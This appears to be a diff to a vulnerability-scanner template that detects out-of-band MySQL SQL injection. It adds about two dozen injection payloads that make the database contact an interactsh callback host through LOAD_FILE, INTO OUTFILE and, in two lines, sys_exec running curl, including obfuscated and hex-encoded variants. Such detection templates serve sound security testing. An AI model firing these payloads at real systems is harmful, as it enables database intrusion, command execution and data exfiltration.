@@ -13,9 +13,31 @@ http:
 
     payloads:
       mysql_oob:
-        - "1' UNION SELECT LOAD_FILE('\\\\{{interactsh-url}}\\\\abc')-- -"
-        - "1" UNION SELECT LOAD_FILE('\\\\{{interactsh-url}}\\\\abc')-- -"
         - "1 UNION SELECT LOAD_FILE('\\\\{{interactsh-url}}\\\\abc')-- -"
+        - "1 UNION SELECT LOAD_FILE('\\\\{{interactsh-url}}\\\\mysql')-- -"
+        - "1' AND (SELECT LOAD_FILE('\\\\{{interactsh-url}}\\\\sub'))-- -"
+        - "1' OR 1=(SELECT LOAD_FILE('\\\\{{interactsh-url}}\\\\where'))-- -"
+        - "1' OR EXISTS(SELECT LOAD_FILE('\\\\{{interactsh-url}}\\\\bool'))-- -"
+        - "1' UNION SELECT 'test' INTO OUTFILE '\\\\{{interactsh-url}}\\\\outfile.txt'-- -"
+        - "1' UNION SELECT CASE WHEN 1=1 THEN LOAD_FILE('\\\\{{interactsh-url}}\\\\case') END-- -"
+        - "1' UNION SELECT LOAD_FILE('\\\\{{interactsh-url}}\\\\mysql')-- -"
+        - "1' UNION SELECT LOAD_FILE(0x5c5c{{interactsh-url-hex}}5c5c6d7973716c)-- -"
+        - "1' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\',CONCAT('{{interactsh-url}}','\\\\\\\\mysql')))-- -"
+        - "1' UNION SELECT sys_exec('curl http://{{interactsh-url}}/mysql')-- -"
+        - "1') UNION SELECT LOAD_FILE('\\\\{{interactsh-url}}\\\\parent')-- -"
+        - "1'),('test',(SELECT LOAD_FILE('\\\\{{interactsh-url}}\\\\insert')))-- -"
+        - "1'/**/UNION/**/SELECT/**/LOAD_FILE('\\\\{{interactsh-url}}\\\\comment')--/**/-"
+        - "1'||(SELECT LOAD_FILE('\\\\{{interactsh-url}}\\\\update'))-- -"
+        - "1\" AND (SELECT LOAD_FILE('\\\\{{interactsh-url}}\\\\sub'))-- -"
+        - "1\" UNION SELECT 'test' INTO OUTFILE '\\\\{{interactsh-url}}\\\\outfile.txt'-- -"
+        - "1\" UNION SELECT CASE WHEN 1=1 THEN LOAD_FILE('\\\\{{interactsh-url}}\\\\case') END-- -"
+        - "1\" UNION SELECT LOAD_FILE('\\\\{{interactsh-url}}\\\\abc')-- -"
+        - "1\" UNION SELECT LOAD_FILE('\\\\{{interactsh-url}}\\\\mysql')-- -"
+        - "1\" UNION SELECT LOAD_FILE(0x5c5c{{interactsh-url-hex}}5c5c6d7973716c)-- -"
+        - "1\" UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\',CONCAT('{{interactsh-url}}','\\\\\\\\mysql')))-- -"
+        - "1\" UNION SELECT sys_exec('curl http://{{interactsh-url}}/mysql')-- -"
+        - "1\") UNION SELECT LOAD_FILE('\\\\{{interactsh-url}}\\\\parent')-- -"
+        - "1\' UNION SELECT LOAD_FILE('\\\\{{interactsh-url}}\\\\abc')-- -"
         
     fuzzing:
       - part: query
@@ -29,3 +51,4 @@ http:
         part: interactsh_protocol
         words:
           - "dns"
+          - "http"
